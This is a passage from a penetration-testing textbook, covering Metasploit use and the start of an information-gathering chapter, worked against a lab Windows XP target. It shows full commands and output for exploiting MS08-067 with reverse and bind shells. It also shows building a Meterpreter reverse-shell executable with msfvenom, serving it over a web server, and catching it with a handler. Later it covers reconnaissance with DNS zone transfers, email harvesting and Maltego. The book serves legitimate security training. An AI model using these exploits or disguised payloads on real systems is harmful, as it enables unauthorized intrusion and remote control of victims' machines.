uLHOST yes The listen address
 LPORT 4444 yes The listen port
Exploit target:
 Id Name
 -- ----
 0 Automatic Targeting
Listing 4-9: Module options with a payload 
100 Chapter 4
LHOST u is our local host on the Kali machine, the IP address we want 
our target machine to connect back to. To find the IP address (if you have 
forgotten it), enter the Linux ifconfig command directly into Msfconsole.
msf exploit(ms08_067_netapi) > ifconfig
[*] exec: ifconfig
eth0 Link encap:Ethernet HWaddr 00:0c:29:0e:8f:11 
 inet addr:192.168.20.9 Bcast:192.168.20.255 Mask:255.255.255.0
--snip--
Now set the LHOST option with set LHOST 192.168.20.9. Leave the defaults 
for LPORT, for the local port to connect back to, as well as for EXITFUNC, which 
tells Metasploit how to exit. Now enter exploit, shown in Listing 4-10, to 
send our exploit off again, and wait for the shell to appear. 
msf exploit(ms08_067_netapi) > exploit
[*] Started reverse handler on 192.168.20.9:4444 u
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX) v
[*] Attempting to trigger the vulnerability...
[*] Command shell session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1374)
 at 2015-08-31 10:29:36 -0400
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>
Listing 4-10: Running the exploit
Congratulations: You have successfully exploited your first machine! 
Here‚Äôs what happened. When we enter exploit, Metasploit opens a listener on port 4444 to catch the reverse shell from the target u. Then, since 
we kept the target as the default Automatic Targeting, Metasploit fingerprinted 
the remote SMB server and selected the appropriate exploit target for us v. 
Once it selected the exploit, Metasploit sent over the exploit string and 
attempted to take control of the target machine and execute our selected 
payload. Because the exploit succeeds, a command shell was caught by our 
handler. 
To close this shell, type ctrl-C and enter y at the prompt to abort the 
session.
C:\WINDOWS\system32>^C
Abort session 2? [y/N] y
[*] Command shell session 2 closed. Reason: User exit
msf exploit(ms08_067_netapi) > 
Using the Metasploit Framework 101
To return to a Meterpreter shell, you can choose a payload with 
Meterpreter in the name such as windows/meterpreter/reverse_tcp and 
exploit the Windows XP target again.
Msfcli
Now for another way to interact with Metasploit: the command line interface, Msfcli. Msfcli is particularly useful when using Metasploit inside scripts 
and for testing Metasploit modules that you‚Äôre developing because it lets 
you run a module with a quick, one-line command. 
Getting Help
To run Msfcli, first exit Msfconsole by entering exit, or just open another 
Linux console. Msfcli is in our path, so we can call it from anywhere. Let‚Äôs 
begin by looking at the help menu for Msfcli with msfcli -h (Listing 4-11). 
root@kali:~# msfcli -h
u Usage: /opt/metasploit/apps/pro/msf3/msfcli <exploit_name> <option=value> [mode] 
==============================================================================
 Mode Description
 ---- -----------
 (A)dvanced Show available advanced options for this module
 (AC)tions Show available actions for this auxiliary module
 (C)heck Run the check routine of the selected module
 (E)xecute Execute the selected module
 (H)elp You're looking at it baby!
 (I)DS Evasion Show available ids evasion options for this module
 v(O)ptions Show available options for this module
 w(P)ayloads Show available payloads for this module
 (S)ummary Show information about this module
 (T)argets Show available targets for this exploit module
Listing 4-11: Msfcli help
Unlike with Msfconsole, when using Msfcli, we can tell Metasploit everything it needs to know to run our exploit in just one command u. Luckily, 
Msfcli has some modes to help us build the final command. For example, 
the O mode v shows the selected module‚Äôs options, and P shows the compatible payloads w. 
Showing Options
Let‚Äôs use our MS08-067 exploit against our Windows XP target again. 
According to the help page, we need to pass Msfcli the exploit name we 
want to use and set all our options u. To show the available options use 
the O mode. Enter msfcli windows/smb/ms08_067_netapi O to see the options 
for the MS08-067 exploit module, as shown in Listing 4-12. 
102 Chapter 4
root@kali:~# msfcli windows/smb/ms08_067_netapi O
[*] Please wait while we load the module tree...
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 RHOST yes The target address
 RPORT 445 yes Set the SMB service port
 SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)
Listing 4-12: Module options
We see the same options as we did in Msfconsole. We‚Äôre reminded to 
set the RHOST option to the IP address of the target machine, but as we saw 
on the help page, setting options in Msfcli is a little different from doing do 
in Msfconsole. Here we say option=value. For example, to set RHOST, we enter 
RHOST=192.168.20.10. 
Payloads
For a reminder of the payloads compatible with this module, use the P mode. 
Try msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P, as shown in 
Listing 4-13.
root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P
[*] Please wait while we load the module tree...
Compatible payloads
===================
 Name Description
 ---- -----------
 generic/custom Use custom string or file as payload. Set
 either PAYLOADFILE or PAYLOADSTR.
 generic/debug_trap Generate a debug trap in the target process
 generic/shell_bind_tcp Listen for a connection and spawn a command
 shell
 generic/shell_reverse_tcp Connect back to attacker and spawn a command
 shell
 generic/tight_loop Generate a tight loop in the target process
--snip--
Listing 4-13: Module payloads in Msfcli
This time, we‚Äôll use a bind shell payload. Recall that a bind shell just 
listens on a local port on the target machine. It will be up to our attack 
machine to connect to the target machine after the payload has run. Recall 
from our work in Msfconsole that choosing a payload requires additional 
payload-specific options, which we can view again with the O flag.
Because our bind shell won‚Äôt be calling back to our attack machine, we 
don‚Äôt need to set the LHOST option, and we can leave the LPORT option as the 
Using the Metasploit Framework 103
default of 4444 for now. It looks like we have everything we need to exploit 
the Windows XP target again. Finally, to tell Msfcli to run the exploit we 
use the E flag (Listing 4-14). 
root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 
PAYLOAD=windows/shell_bind_tcp E
[*] Please wait while we load the module tree...
RHOST => 192.168.20.10
PAYLOAD => windows/shell_bind_tcp
[*] Started bind handler u
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Command shell session 1 opened (192.168.20.9:35156 -> 192.168.20.10:4444) 
 at 2015-08-31 16:43:54 -0400
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>
Listing 4-14: Running the exploit in Msfcli 
It looks like everything worked, and we got another shell. But this time, 
instead of starting a reverse handler listening on the specified local port 
of 4444, Metasploit starts a handler for the bind shell u. After Metasploit 
sends over the exploit string, the bind handler will automatically connect 
out to the port specified by the payload and connect to the shell. Once 
again, we have taken control of the target machine. 
Creating Standalone Payloads with Msfven
In 2011, Msfvenom was added to Metasploit. Prior to Msfvenom, the tools 
Msfpayload and Msfencode could be used together to create standalone 
encoded Metasploit payloads in a variety of output formats, such as Windows 
executables and ASP pages. With the introduction of Msfvenom, the functionality of Msfpayload and Msfencode was combined into a single tool, 
though Msfpayload and Msfencode are still included in Metasploit. To view 
Msfvenom‚Äôs help page, enter msfvenom -h.
So far with Metasploit, our goal has been to exploit a vulnerability on 
the target system and take control of the machine. Now we‚Äôll do something 
a little different. Instead of relying on a missing patch or other security 
issue, we are hoping to exploit the one security issue that may never be fully 
patched: the users. Msfvenom allows you to build standalone payloads to 
run on a target system in an attempt to exploit the user whether through a 
social-engineering attack (Chapter 11) or by uploading a payload to a vulnerable server, as we‚Äôll see in Chapter 8. When all else fails, the user can 
often be a way in.
104 Chapter 4
Choosing a Payload
To list all the available payloads, enter msfvenom -l payloads. We‚Äôll use one 
of Metasploit‚Äôs Meterpreter payloads, windows/meterpreter/reverse_tcp, which 
provides a reverse connection with a Meterpreter shell. Use -p to select a 
payload.
Setting Options
To see the correct options to use for a module, enter the -o flag after selecting a payload, as shown in Listing 4-15.
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o
[*] Options for payload/windows/meterpreter/reverse_tcp
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 EXITFUNC process yes Exit technique: seh, thread, process, 
 none
 LHOST yes The listen address
 LPORT 4444 yes The listen port
Listing 4-15: Options in Msfvenom
As expected, our LHOST needs to be set, and our LPORT is set to the default 
4444. For practice, set LPORT to 12345 by entering LPORT=12345. We also see 
EXITFUNC, which we can leave as the default. Because this is a reverse connection payload, we need to set our LHOST option to tell the target machine where 
to connect back to (our Kali machine). 
Choosing an Output Format
Now tell Msfvenom which output format to use. Will we be running this payload from a Windows executable, or do we want to make an ASP file that 
can be uploaded to a web server we have gained write access to? To see all 
available output formats, enter msfvenom --help-formats.
root@kali:~# msfvenom --help-formats
Executable formats
 asp, aspx, aspx-exe, dll, elf, exe, exe-only, exe-service, exe-small, 
 loop-vbs, macho, msi, msi-nouac, psh, psh-net, vba, vba-exe, vbs, war
Transform formats
 bash, c, csharp, dw, dword, java, js_be, js_le, num, perl, pl, powershell, 
 psl, py, python, raw, rb, ruby, sh, vbapplication, vbscript
To select the output format, use the -f option along with the chosen 
format: 
msfvenom windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe
Using the Metasploit Framework 105
But if you run this command as is, you‚Äôll see garbage printed to the 
console. While this is technically our executable payload, it doesn‚Äôt do us 
much good. Instead, let‚Äôs redirect the output to an executable file, 
chapter4example.exe. 
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe 
> chapter4example.exe
root@kali:~# file chapter4example.exe
chapter4example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit
There is no output to the screen, but if we run the file command on 
our newly created executable file, we see that it‚Äôs a Windows executable that 
will run on any Windows system as long as a user attempts to run it. (Later, 
in Chapter 12, we‚Äôll see cases where antivirus applications stop a Metasploit 
payload and learn ways we can obfuscate our standalone payloads to bypass 
antivirus programs. Also, we will cover clever ways to lure users into downloading and running malicious payloads in Chapter 11.)
Serving Payloads
One good way to serve up payloads is to host them on a web server, disguise 
them as something useful, and lure users into downloading them. For this 
example, we‚Äôll host our Metasploit executable on our Kali machine‚Äôs builtin Apache server and browse to the file from our target machine. 
First, run cp chapter4example.exe /var/www to copy the payload executable 
to the Apache directory, and then make sure the web server is started with 
service apache2 start.
root@kali:~# cp chapter4example.exe /var/www
root@kali:~# service apache2 start
Starting web server apache2 [ OK ]
Now switch to your Windows XP target and open Internet Explorer. 
Browse to http://192.168.20.9/chapter4example.exe and download the file. 
But before we run the file, we have one loose end to deal with. 
So far when attempting to exploit our target machine, Metasploit set 
up our payload handlers and sent the exploit. When we used Msfconsole to 
exploit the MS08-067 vulnerability with a reverse shell payload, Metasploit 
first set up a handler listening on port 4444 for the reverse connection, but 
up to this point we have nothing listening for a reverse connection from the 
payload we created with Msfvenom. 
Using the Multi/Handler Module
Start Msfconsole again, and we‚Äôll look at a Metasploit module called multi/
handler. This module allows us to set up standalone handlers, which is just 
what we‚Äôre lacking. We need a handler to catch our Meterpreter connection 
when our malicious executable is run from the Windows XP target. Select 
the multi/handler module with use multi/handler. 
106 Chapter 4
The first thing to do is tell multi/handler which of Metasploit‚Äôs many 
handlers we need. We need to catch the windows/meterpreter/reverse_tcp 
payload we used when we created our executable with Msfvenom. Choose 
it with set PAYLOAD windows/meterpreter/reverse_tcp, and follow it with show 
options (Listing 4-16).
msf > use multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > show options
Module options (exploit/multi/handler):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
Payload options (windows/meterpreter/reverse_tcp):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 EXITFUNC process yes Exit technique: seh, thread, process, 
 none
 LHOST yes The listen address
 LPORT 4444 yes The listen port
--snip--
msf exploit(handler) > 
Listing 4-16: Options with multi/handler
From here we tell Metasploit which setup we used when we created the 
payload. We‚Äôll set the LHOST option to our local Kali IP address and the LPORT
to the port we chose in Msfvenom, in this case 192.168.20.9 and 12345, 
respectively. Once all the options for the payload are set correctly, enter 
exploit, as shown in Listing 4-17.
msf exploit(handler) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(handler) > set LPORT 12345
LPORT => 12345
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.20.9:12345 
[*] Starting the payload handler...
Listing 4-17: Setting up a handler
As you can see, Metasploit sets up a reverse handler on port 12345 as 
instructed, listening for a payload to call back. 
Using the Metasploit Framework 107
Now we can switch back to our Windows XP target and run our downloaded executable. Run chapter4example.exe on your Windows target. Back 
in Msfconsole, you should see that the handler receives the reverse connection, and you receive a Meterpreter session. 
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:12345 -> 192.168.20.10:49437) 
at 2015-09-01 11:20:00 -0400
meterpreter > 
Spend some time experimenting with Msfvenom if you like. We‚Äôll 
return to this useful tool when we attempt to bypass antivirus solutions 
in Chapter 12.
Using an Auxiliary Modu
Metasploit was first conceived as an exploitation framework, and it continues to be a top contender in the world of exploitation. But in the ensuing 
years, its functionality has grown in about as many directions as there are 
creative minds working on it. I sometimes quip that Metasploit can do everything except my laundry, and I‚Äôm currently working on a module for that. 
Dirty socks aside, in addition to exploitation, Metasploit has modules 
to aid in every phase of pentesting. Some modules that are not used for 
exploitation are known as auxiliary modules; they include things like vulnerability scanners, fuzzers, and even denial of service modules. (A good rule 
of thumb to remember is that exploit modules use a payload and auxiliary 
modules do not.)
For example, when we first used the windows/smb/ms08_067_netapi
exploit module earlier in this chapter, one of its options was SMBPIPE. The 
default value for that option was BROWSER. Let‚Äôs look at an auxiliary module 
that will enumerate the listening pipes on an SMB server, auxiliary/scanner/
smb/pipe_auditor (Listing 4-18). (We use auxiliary modules like exploits, and 
like exploits we can also drop the auxiliary/ part of the module name.)
msf > use scanner/smb/pipe_auditor
msf auxiliary(pipe_auditor) > show options
Module options (auxiliary/scanner/smb/pipe_auditor):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
uRHOSTS yes The target address range or CIDR identifier
 SMBDomain WORKGROUP no The Windows domain to use for authentication
 SMBPass no The password for the specified username
 SMBUser no The username to authenticate as
 THREADS 1 yes The number of concurrent threads
Listing 4-18: Options for scanner/smb/pipe_auditor
108 Chapter 4
The options for this module are a bit different from what we‚Äôve seen so 
far. Instead of RHOST we have RHOSTS u, which allows us to specify more than 
one remote host to run the module against. (Auxiliaries can be run against 
multiple hosts, whereas exploits can exploit only one system at a time.) 
We also see options for SMBUser, SMBPass, and SMBDomain. Because our 
Windows XP target is not part of any domain, we can leave the SMBDomain
at the default value, WORKGROUP. We can leave the SMBUser and SMBPass values 
blank. The THREADS option allows us to control the speed of Metasploit by 
having our module run in multiple threads. We‚Äôre scanning only one system in this case, so the default value of 1 thread will work fine. The only 
option we need to set is RHOSTS to the IP address of our Windows XP target.
msf auxiliary(pipe_auditor) > set RHOSTS 192.168.20.10
RHOSTS => 192.168.20.10
Even though we aren‚Äôt technically exploiting anything in this case, we 
can still tell Metasploit to run our auxiliary module by entering exploit. 
msf auxiliary(pipe_auditor) > exploit
[*] 192.168.20.10 - Pipes: \browser u
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(pipe_auditor) > 
The module audits the listening SMB pipes on our Windows XP target. As it turns out, the browser pipe is the only available pipe u. Because 
this pipe is listening, this is the correct value for the SMBPIPE option in 
the windows/smb/ms08_067_netapi exploit module we used earlier in the 
chapter. 
Updating Metasp
The exercises in this book are designed to work on a base install of Kali 
Linux 1.0.6. Naturally, many security tools used in this book will have be
updated since Kali‚Äôs release. Metasploit in particular receives regular updates
from core developers as well as from the security community
All of the material in this book works with the Metasploit version installed 
on Kali 1.0.6. As you continue your career as a pentester, you‚Äôll want the late
Metasploit modules. The Metasploit Project is typically pretty solid at releasing
modules for the latest security issues circulating the Web. To pull down the latest modules from Metasploit‚Äôs GitHub, enter the following:
root@kali:~# msfupdate
Using the Metasploit Framework 109
Summar
In this chapter we‚Äôve gotten comfortable using some of Metasploit‚Äôs interfaces. We‚Äôll return to Metasploit throughout the book. 
In the next few chapters we‚Äôll simulate a penetration test against our 
target machines, covering a wide variety of vulnerability types. If you pursue a career in penetration testing, you will likely encounter clients spanning the gamut of possible security postures. Some will be missing so many 
patches across the organization that you may wonder if they have updated 
since installing the base image back in 2001. Along with missing patches, 
you may find additional vulnerabilities such as default passwords and misconfigured services. Gaining access to such networks is trivial for skilled 
penetration testers. 
On the other hand, you may also find yourself working for clients who 
have patch management down pat, with everything from Windows operating systems to all third-party software on a regular patch cycle across the 
organization. Some clients may deploy cutting-edge security controls such 
as proxies that allow only Internet Explorer to call out to the Internet. This 
will stop even Metasploit reverse shells that call back on ports 80 or 443 and 
look like web traffic, unless you are able to exploit the Internet Explorer 
program, which may also be completely patched. You may find intrusion 
prevention firewalls at the perimeter that drop any string that looks even 
a little bit like attack traffic. 
Simply throwing the MS08-067 Metasploit module at these highsecurity networks will get you no results, except maybe a call from a network monitoring vendor with a warrant for your arrest. (Don‚Äôt worry: As 
part of the penetration test, you will have a get-out-of-jail-free card.) But 
even highly secure networks are only as strong as their weakest link. For 
instance, I once performed an onsite penetration test for a company that 
employed all of the security controls I just mentioned. However, the local 
administrator password on all the Windows workstations was the same fiveletter dictionary word. After I cracked the password, I was able to log on as 
an administrator on every workstation on the network. From there I was 
able to use something called token impersonation to gain domain administrator access. Despite all the strong security controls, with a little effort I was 
able to take over the network the same way I would a network with missing 
patches from 2003.
As you work through the rest of this book, you will pick up not only the 
technical skills required to break into vulnerable systems but also the mindset required to find a way in when none seems readily apparent. 
Now let‚Äôs turn our attention to gathering information about our targets 
so we can develop a solid plan of attack. 

Part 
A ssessment

5
I nformationG a  h er
In this chapter we begin the information-gathering 
phase of penetration testing. The goal of this phase 
is to learn as much about our clients as we can. Does 
the CEO reveal way too much on Twitter? Is the system administrator writing to archived listservs, asking 
about how to secure a Drupal install? What software 
are their web servers running? Are the Internet-facing systems listening 
on more ports than they should? Or, if this is an internal penetration test, 
what is the IP address of the domain controller? 
We‚Äôll also start to interact with our target systems, learning as much as 
we can about them without actively attacking them. We‚Äôll use the knowledge 
gained in this phase to move on to the threat-modeling phase where we 
think like attackers and develop plans of attack based on the information 
114 Chapter 5
we‚Äôve gathered. Based on the information we uncover, we‚Äôll actively search 
for and verify vulnerabilities using vulnerability-scanning techniques, which 
are covered in the next chapter.
Open Source Intelligence Gather
We can learn a good deal about our client‚Äôs organization and infrastructure 
before we send a single packet their way, but information gathering can still 
be a bit of a moving target. It isn‚Äôt feasible to study the online life of every 
employee, and given a large amount of gathered information, it can be difficult to discern important data from noise. If the CEO tweets frequently 
about a favorite sports team, that team‚Äôs name may be the basis for her 
webmail password, but it could just as easily be entirely irrelevant. Other 
times it will be easier to pick up on something crucial. For instance, if your 
client has online job postings for a system administrator who is an expert 
in certain software, chances are those platforms are deployed in the client‚Äôs 
infrastructure. 
As opposed to intelligence gained from covert sources such as dumpster diving, dumping website databases, and social engineering, open source 
intelligence (or OSINT) is gathered from legal sources like public records 
and social media. The success of a pentest often depends on the results of 
the information-gathering phase, so in this section, we will look at a few 
tools to obtain interesting information from these public sources. 
Netcraft
Sometimes the information that web servers and web-hosting companies 
gather and make publicly available can tell you a lot about a website. For 
instance, a company called Netcraft logs the uptime and makes queries 
about the underlying software. (This information is made publicly available 
at http://www.netcraft.com/.) Netcraft also provides other services, and their 
antiphishing offerings are of particular interest to information security. 
For example, Figure 5-1 shows the result when we query http://www
.netcraft.com/ for http://www.bulbsecurity.com. As you can see, bulbsecurity.com
was first seen in March 2012. It was registered through GoDaddy, has an IP 
address of 50.63.212.1, and is running Linux with an Apache web server. 
Armed with this information, when pentesting bulbsecurity.com, we could 
start by ruling out vulnerabilities that affect only Microsoft IIS servers. Or, 
if we wanted to try social engineering to get credentials to the website, we 
could write an email that appears to be from GoDaddy, asking the administrator to log in and check some security settings. 
Information Gathering 115
Figure 5-1: Netcraft‚Äôs results for bulbsecurity.co
Whois Lookups
All domain registrars keep records of the domains they host. These records 
contain information about the owner, including contact information. For 
example, if we run the Whois command line tool on our Kali machine to 
query for information about bulbsecurity.com, as shown in Listing 5-1, we see 
that I used private registration, so we won‚Äôt learn much.
root@kali:~# whois bulbsecurity.com
 Registered through: GoDaddy.com, LLC (http://www.godaddy.com)
 Domain Name: BULBSECURITY.COM
 Created on: 21-Dec-11
 Expires on: 21-Dec-12
 Last Updated on: 21-Dec-11
 Registrant: u 
 Domains By Proxy, LLC
 DomainsByProxy.com
 14747 N Northsight Blvd Suite 111, PMB 309
 Scottsdale, Arizona 85260
 United States
116 Chapter 5
 Technical Contact: v
 Private, Registration BULBSECURITY.COM@domainsbyproxy.com
 Domains By Proxy, LLC
 DomainsByProxy.com
 14747 N Northsight Blvd Suite 111, PMB 309
 Scottsdale, Arizona 85260
 United States
 (480) 624-2599 Fax -- (480) 624-2598
 Domain servers in listed order:
 NS65.DOMAINCONTROL.COM w
 NS66.DOMAINCONTROL.COM
Listing 5-1: Whois information for bulbsecurity.co
This site has private registration, so both the registrant u and technical 
contact v are domains by proxy. Domains by proxy offer private registration, hiding your personal details in the Whois information for the domains 
you own. However, we do see the domain servers w for bulbsecurity.com. 
Running Whois queries against other domains will show more interesting 
results. For example, if you do a Whois lookup on georgiaweidman.com, you 
might get an interesting blast from the past, including my college phone 
number. 
DNS Reconnaissance
We can also use Domain Name System (DNS) servers to learn more about a 
domain. DNS servers translate the human-readable URL www.bulbsecurity.com
into an IP address. 
Nslookup
For example, we could use a command line tool such as Nslookup, as shown 
in Listing 5-2.
root@Kali:~# nslookup www.bulbsecurity.com
Server: 75.75.75.75
Address: 75.75.75.75#53
Non-authoritative answer:
www.bulbsecurity.com canonical name = bulbsecurity.com.
Name: bulbsecurity.com
Address: 50.63.212.1 u
Listing 5-2: Nslookup information for www.bulbsecurity.c
Nslookup returned the IP address of www.bulbsecurity.com, as you can 
see at u. 
We can also tell Nslookup to find the mail servers for the same website 
by looking for MX records (DNS speak for email), as shown in Listing 5-3. 
Information Gathering 117
root@kali:~# nslookup
> set type=mx
> bulbsecurity.com
Server: 75.75.75.75
Address: 75.75.75.75#53
Non-authoritative answer:
bulbsecurity.com mail exchanger = 40 ASPMX2.GOOGLEMAIL.com.
bulbsecurity.com mail exchanger = 20 ALT1.ASPMX.L.GOOGLE.com.
bulbsecurity.com mail exchanger = 50 ASPMX3.GOOGLEMAIL.com.
bulbsecurity.com mail exchanger = 30 ALT2.ASPMX.L.GOOGLE.com.
bulbsecurity.com mail exchanger = 10 ASPMX.L.GOOGLE.com.
Listing 5-3: Nslookup information for bulbsecurity.com‚Äôs mail servers
Nslookup says bulbsecurity.com is using Google Mail for its email servers, 
which is correct because I use Google Apps. 
Host
Another utility for DNS queries is Host. We can ask Host for the name 
servers for a domain with the command host -t ns domain. A good example 
for domain queries is zoneedit.com, a domain set up to demonstrate zone 
transfer vulnerabilities, as shown here. 
root@kali:~# host -t ns zoneedit.com
zoneedit.com name server ns4.zoneedit.com.
zoneedit.com name server ns3.zoneedit.com.
--snip--
This output shows us all the DNS servers for zoneedit.com. Naturally, 
because I mentioned that this domain was set up to demonstrate zone 
transfers, that‚Äôs what we are going to do next. 
Zone Transfers
DNS zone transfers allow name servers to replicate all the entries about a 
domain. When setting up DNS servers, you typically have a primary name 
server and a backup server. What better way to populate all the entries in 
the secondary DNS server than to query the primary server for all of its 
entries? 
Unfortunately, many system administrators set up DNS zone transfers 
insecurely, so that anyone can transfer the DNS records for a domain. 
zoneedit.com is an example of such a domain, and we can use the host command to download all of its DNS records. Use the -l option to specify the 
domain to transfer, and choose one of the name servers from the previous 
command, as shown in Listing 5-4. 
118 Chapter 5
root@kali:~# host -l zoneedit.com ns2.zoneedit.com
Using domain server:
Name: ns2.zoneedit.com
Address: 69.72.158.226#53
Aliases: 
zoneedit.com name server ns4.zoneedit.com.
zoneedit.com name server ns3.zoneedit.com.
zoneedit.com name server ns15.zoneedit.com.
zoneedit.com name server ns8.zoneedit.com.
zoneedit.com name server ns2.zoneedit.com.
zoneedit.com has address 64.85.73.107
www1.zoneedit.com has address 64.85.73.41
dynamic.zoneedit.com has address 64.85.73.112
bounce.zoneedit.com has address 64.85.73.100
--snip--
mail2.zoneedit.com has address 67.15.232.182
--snip--
Listing 5-4: Zone transfer of zoneedit.co
There are pages and pages of DNS entries for zoneedit.com, which gives 
us a good idea of where to start in looking for vulnerabilities for our pentest. For example, mail2.zoneedit.com is probably a mail server, so we should 
look for potentially vulnerable software running on typical email ports such 
as 25 (Simple Mail Transfer Protocol) and 110 (POP3). If we can find a webmail server, any usernames we find may lead us in the right direction so that 
we can guess passwords and gain access to sensitive company emails. 
Searching for Email Addresses
External penetration tests often find fewer services exposed than internal 
ones do. A good security practice is to expose only those services that must 
be accessed remotely, like web servers, mail servers, VPN servers, and maybe 
SSH or FTP, and only those services that are mission critical. Services like 
these are common attack surfaces, and unless employees use two-factor 
authentication, accessing company webmail can be simple if an attacker 
can guess valid credentials. 
One excellent way to find usernames is by looking for email addresses 
on the Internet. You might be surprised to find corporate email addresses 
publicly listed on parent-teacher association contact info, sports team rosters, and, of course, social media.
You can use a Python tool called theHarvester to quickly scour thousands of search engine results for possible email addresses. theHarvester 
can automate searching Google, Bing, PGP, LinkedIn, and others for email 
addresses. For example, in Listing 5-5, we‚Äôll look at the first 500 results in 
all search engines for bulbsecurity.com. 
Information Gathering 119
root@kali:~# theharvester -d bulbsecurity.com -l 500 -b all
*******************************************************************
* *
* | |_| |__ ___ /\ /\__ _ _ ____ _____ ___| |_ ___ _ __ *
* | __| '_ \ / _ \ / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
* | |_| | | | __/ / __ / (_| | | \ V / __/\__ \ || __/ | *
* \__|_| |_|\___| \/ /_/ \__,_|_| \_/ \___||___/\__\___|_| *
* *
* TheHarvester Ver. 2.2a *
* Coded by Christian Martorella *
* Edge-Security Research *
* cmartorella@edge-security.com *
*******************************************************************
Full harvest..
[-] Searching in Google..
 Searching 0 results...
 Searching 100 results...
 Searching 200 results...
 Searching 300 results...
--snip--
 [+] Emails found:
------------------
georgia@bulbsecurity.com
[+] Hosts found in search engines:
------------------------------------
50.63.212.1:www.bulbsecurity.com
--snip--
Listing 5-5: Running theHarvester against bulbsecurity.com
There‚Äôs not too much to be found for bulbsecurity.com, but theHarvester 
does find my email address, georgia@bulbsecurity.com, and the website, 
www.bulbsecurity.com, as well as other websites I share virtual hosting 
with. You may find more results if you run theHarvester against your 
organization. 
Maltego
Paterva‚Äôs Maltego is a data-mining tool designed to visualize open source 
intelligence gathering. Maltego has both a commercial and a free community edition. The free Kali Linux version, which we‚Äôll use in this book, 
limits the results it returns, but we can still use it to gather a good deal of 
interesting information very quickly. (The paid version offers more results 
and functionality. To use Maltego on your pentests, you will need a paid 
license.)
120 Chapter 5
N ote Feel free to use Maltego to study other Internet footprints, including your own, your
company‚Äôs, your high school arch nemesis‚Äôs, and so on. Maltego uses information 
publicly available on the Internet, so it is perfectly legal to do reconnaissance on any 
entity. 
To run Maltego, enter maltego at the command line. The Maltego GUI 
should launch. You will be prompted to create a free account at the Paterva 
website and log in. Once logged in, choose Open a blank graph and let me 
play around, and then click Finish, as shown in Figure 5-2. 
Figure 5-2: Opening a new Maltego graph
Now select the Palette option from the left-hand border. As you can see, 
we can gather information about all sorts of entities. 
Let‚Äôs start with the bulbsecurity.com domain, as shown in Figure 5-3. 
Expand the Infrastructure option from the Palette (on the left of the 
Maltego window) and drag a Domain entity from the Palette onto the new 
graph. By default, the domain is paterva.com. To change it to bulbsecurity.com, 
either double-click the text or change the text field at the right side of the 
screen. 
Information Gathering 121
Figure 5-3: Adding an entity to the graph
Once the domain is set, you can run transforms (Maltego-speak for 
queries) on it, instructing Maltego to search for interesting information. 
Let‚Äôs start with a couple of simple transforms, which you can view by rightclicking the domain icon and choosing Run Transform, as shown in 
Figure 5-4. 
In the figure, we can see all the transforms available for a domain entity. 
As you work with different entities, different transform options will be available. Let‚Äôs find the MX records for the bulbsecurity.com domain and, thus, 
where the mail servers are. Under All Transforms, choose the To DNS 
Name ‚Äì MX (mail server) transform. 
As expected from our previous research, Maltego returns Google Mail 
servers, indicating that bulbsecurity.com uses Google Apps for email. We can 
run the simple To Website [Quick lookup] transform to get the website 
address of bulbsecurity.com. See Figure 5-5 for the results from both this and 
the previous transform.
122 Chapter 5
Figure 5-4: Maltego transforms 
Figure 5-5: Transform results
Information Gathering 123
Maltego correctly finds www.bulbsecurity.com. Attacking the Google 
Mail servers will likely be out of the scope of any pentest, but more information on the www.bulbsecurity.com website would certainly be useful. 
We can run transforms on any entity on the graph, so select the website 
www.bulbsecurity.com to gather data on it. For instance, we can run the transform ToServerTechnologiesWebsite to see what software www.bulbsecurity.com
is running, as shown in Figure 5-6. 
Figure 5-6: www.bulbsecurity.com softwa
Maltego finds that www.bulbsecurity.com is an Apache web server with 
PHP, Flash, and so on, along with a WordPress install. WordPress, a commonly used blogging platform, has a long history of security issues (like 
a lot of software). We‚Äôll look at exploiting website vulnerabilities in Chapter 14. (Let‚Äôs hope I am keeping my WordPress blog up to date, or else I 
might wake up to find my site defaced one day. How embarrassing!) 
You can find additional information and tutorials about Maltego at 
http://www.paterva.com/. Spend some time using Maltego transforms to find 
interesting information about your organization. In skilled hands, Maltego 
can turn hours of reconnaissance work into minutes with the same quality 
results. 
Port Scanning
When you start a pentest, the potential scope is practically limitless. The 
client could be running any number of programs with security issues: They 
could have misconfiguration issues in their infrastructure that could lead to 
compromise; weak or default passwords could give up the keys to the kingdom on otherwise secure systems; and so on. Pentests often narrow your 
124 Chapter 5
scope to a particular IP range and nothing more, and you won‚Äôt help your 
client by developing a working exploit for the latest and greatest server-side 
vulnerability if they don‚Äôt use the vulnerable software. We need to find out 
which systems are active and which software we can talk to. 
Manual Port Scanning
For example, in the previous chapter we saw that exploiting the MS08-
067 vulnerability can be an easy win for attackers and pentesters alike. To 
use this exploit, we need to find a Windows 2000, XP, or 2003 box with an 
